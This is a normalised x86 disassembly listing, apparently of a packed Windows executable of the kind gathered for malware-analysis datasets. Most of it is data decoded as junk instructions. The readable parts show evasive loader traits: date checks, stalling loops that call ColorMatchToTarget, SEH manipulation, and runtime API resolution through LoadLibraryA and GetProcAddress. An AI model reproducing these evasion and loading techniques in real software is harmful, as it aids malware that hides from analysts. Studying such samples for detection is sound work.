push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_465880
sbb al 0x89
sar [ edx + 0x2268c689 ] 0xa
add eax 0x6a8538d0
mov esi 0x8539680b
push 0xffffffbe
punpckhbw mm7 [ edx ]
test [ edx - 0x42 ] ebp
or eax 0x1c14440a
sbb al 0x73
or dh al
sub [ esp + ebx ] bl
jae r-xdata
mov dh 0x68
punpcklbw mmx1 [ edi ]
mov ebx 0xb523d0b0
mov ah 0x6a
cmpsb [ esi ] [ edi ]
pop ds
push 0xffffffa6
sbb ebp [ edx - 0x5a ]
pop ss
pop ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
push ebx
push esp
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jae r-xdata
cmp [ ebp - 0x47e04196 ] eax
or bl ch
sbb al 0x1c
sbb al 0x73
jae r-xdata
in al dx
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
sbb ebp [ edx - 0x4a ]
pop ss
push 0xa66a1fa6
or ebp [ eax - 0x5a ]
sbb ebp [ edx - 0x5a ]
punpckhbw mm4 [ esi + 0x13a66a17 ]
shl [ ebx ] 0x1
shl [ ecx ] 0x1
push 0xffffffa6
pop ds
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
sbb al 0x1c
mov bl 0x1c
xchg esi eax
jecxz r-xdata
bound ecx [ edi ]
imul esp ecx 0xffffffe3
jecxz r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp bl [ esp + ebx ]
jecxz r-xdata
mov ebp 0x1c29ec0a
sbb al 0x73
out dx eax
in al dx
popad
fild [ ecx ]
sbb al 0x1c
scasb [ edi ]
mov ecx 0x700ae3e3
add ebx [ esp + ebx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
aas
pop edx
sbb al 0x1c
adc al 0x3b
clc
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x96
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0xa6
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov edx 0xece11b60
jae r-xdata
retn
jae r-xdata
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
outsb
outsb
outsd
push ds
sbb al 0x1c
or ebx [ ebp + ebp - 0x4545e3e4 ]
or bl [ ebp + 0x731c1c1f ]
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
and edi [ edx + 0x202a3b14 ]
add [ edx + 0x1c ] ebx
sbb al 0x14
cmp edi eax
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
jae r-xdata
cdq
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp

sbb al 0xb4
scasd [ edi ]
and bp sp
0x1c13
nop
and al 0xa6
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
loop r-xdata
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
ja r-xdata
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
mov bh 0xb
sbb al 0x73
jae r-xdata
jae r-xdata
rol ebx 0xc1
jae r-xdata
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
mov bl 0xb0
or cl dh
sbb al 0x1c
jae r-xdata
lahf
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
in al dx
push esp
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
jmp 0xffffffffe3db145e
jae r-xdata
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
loop r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
push 0xb30f620f
loope r-xdata
jecxz r-xdata
jae r-xdata
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
iretd
jae r-xdata
jecxz r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
btr [ edx ] ecx
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x1c
fistp [ ebx ]
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
